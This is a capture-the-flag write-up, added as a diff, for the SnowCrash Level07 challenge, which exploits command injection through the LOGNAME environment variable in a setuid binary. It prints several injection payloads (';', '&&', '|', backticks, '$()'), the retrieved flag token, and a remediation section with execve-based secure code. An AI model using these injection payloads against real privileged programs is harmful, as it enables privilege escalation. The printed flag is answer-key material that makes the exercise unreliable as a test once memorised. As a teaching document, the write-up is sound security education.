@@ -1,0 +1,230 @@
+# SnowCrash Level07 - Exploitation Writeup
+
+## Overview
+Level07 exploits a command injection vulnerability in a setuid binary that executes shell commands using user-controlled environment variables without proper sanitization.
+
+## Discovery Process
+
+### 1. Initial Investigation
+Listed files in the home directory:
+```bash
+ls -la
+```
+
+Found:
+- `level07` - A setuid binary owned by flag07 (with both setuid and setgid bits set)
+
+### 2. Testing the Binary
+```bash
+./level07
+```
+
+Output:
+```
+level07
+```
+
+The program simply prints "level07" and exits. This suggests it might be reading an environment variable.
+
+### 3. Analyzing the Binary
+Used `strings` to examine the binary:
+```bash
+strings level07
+```
+
+**Key findings:**
+```
+LOGNAME
+/bin/echo %s
+```
+
+This reveals:
+- The program reads the `LOGNAME` environment variable
+- It uses `/bin/echo %s` to display the value
+- The command is executed via `system()` call
+
+### 4. Understanding the Vulnerability
+From the strings output, we can deduce the vulnerable code structure:
+```c
+char *buffer;
+char *logname = getenv("LOGNAME");
+asprintf(&buffer, "/bin/echo %s", logname);
+system(buffer);
+```
+
+**The vulnerability:** The `LOGNAME` variable is directly inserted into a shell command without sanitization, allowing command injection.
+
+## Exploitation Steps
+
+### 1. Verify Environment Variable Control
+Test that we can control the output:
+```bash
+export LOGNAME=JAWAHER
+./level07
+```
+
+Output:
+```
+JAWAHER
+```
+
+Confirmed! The program echoes our `LOGNAME` value.
+
+### 2. Inject Shell Commands
+Since the program uses `system()` to execute `/bin/echo $LOGNAME`, we can inject additional commands using shell command separators (`;`):
+```bash
+export LOGNAME="JAWAHER; getflag"
+./level07
+```
+
+Output:
+```
+JAWAHER
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+
+**Success!** The injected `getflag` command executed with flag07 privileges.
+
+### 3. Understanding the Injection
+The constructed command becomes:
+```bash
+/bin/echo JAWAHER; getflag
+```
+
+This executes as two separate commands:
+1. `/bin/echo JAWAHER` - Prints "JAWAHER"
+2. `getflag` - Retrieves the flag with flag07 privileges
+
+### 4. Additional Testing
+We can inject multiple commands:
+```bash
+export LOGNAME="ls ; getflag; ls"
+./level07
+```
+
+Output:
+```
+ls
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+ls: cannot open directory .: Permission denied
+```
+
+This confirms arbitrary command execution capability.
+
+## Result
+```
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+
+## Flag
+**fiumuikeil55xe9cu4dood66h**
+
+## Vulnerability Explanation
+This level demonstrates a **command injection vulnerability** caused by:
+
+### Root Cause
+The program constructs a shell command using unsanitized user input:
+```c
+asprintf(&buffer, "/bin/echo %s", getenv("LOGNAME"));
+system(buffer);
+```
+
+### Why This Is Dangerous
+1. **Environment variables are user-controlled** - Any user can set them
+2. **No input validation** - The `LOGNAME` value is used directly
+3. **Shell metacharacters** - The `;` character allows command chaining
+4. **Privileged execution** - The setuid bit means commands run as flag07
+5. **system() function** - Spawns a shell that interprets special characters
+
+### Attack Vector
+By setting `LOGNAME` to include shell metacharacters:
+- `;` - Command separator
+- `&&` - Logical AND (execute if previous succeeds)
+- `||` - Logical OR (execute if previous fails)
+- `` `cmd` `` - Command substitution
+- `$(cmd)` - Command substitution
+
+Any of these can be used to inject arbitrary commands.
+
+## Security Lessons
+
+### 1. Never Use system() with User Input
+```c
+// VULNERABLE
+system("/bin/echo " + user_input);
+
+// SAFE - Use execve() with separate arguments
+char *args[] = {"/bin/echo", user_input, NULL};
+execve("/bin/echo", args, NULL);
+```
+
+### 2. Validate and Sanitize Input
+```c
+// Check for dangerous characters
+if (strchr(logname, ';') || strchr(logname, '|') || strchr(logname, '&')) {
+    fprintf(stderr, "Invalid characters detected\n");
+    exit(1);
+}
+```
+
+### 3. Use Safe Alternatives
+- **execve()** - Doesn't invoke a shell, takes separate arguments
+- **execl/execlp/execle** - Similar, but different interfaces
+- **Never concatenate strings for shell execution**
+
+### 4. Principle of Least Privilege
+- Avoid setuid binaries when possible
+- Drop privileges as soon as possible
+- Use capability-based security
+
+### 5. Input Validation Best Practices
+- **Whitelist** acceptable characters instead of blacklisting dangerous ones
+- **Escape** special characters if shell execution is unavoidable
+- **Validate** environment variables before use
+
+## Secure Code Example
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main() {
+    char *logname = getenv("LOGNAME");
+    
+    if (!logname) {
+        fprintf(stderr, "LOGNAME not set\n");
+        return 1;
+    }
+    
+    // Validate: only allow alphanumeric and underscore
+    for (int i = 0; logname[i]; i++) {
+        if (!isalnum(logname[i]) && logname[i] != '_') {
+            fprintf(stderr, "Invalid characters in LOGNAME\n");
+            return 1;
+        }
+    }
+    
+    // Use execl instead of system - no shell interpretation
+    char *args[] = {"/bin/echo", logname, NULL};
+    execve("/bin/echo", args, NULL);
+    
+    return 0;
+}
+```
+
+## Tools Used
+- **strings** - Extract readable strings from binaries
+- **export** - Set environment variables
+- **Shell command injection** - Using `;` to chain commands
+
+## Additional Command Injection Techniques
+Other payloads that would work:
+```bash
+export LOGNAME="x; getflag"
+export LOGNAME="x && getflag"
+export LOGNAME="x || getflag"
+export LOGNAME="x | getflag"
+export LOGNAME="\`getflag\`"
+export LOGNAME="$(getflag)"
+```
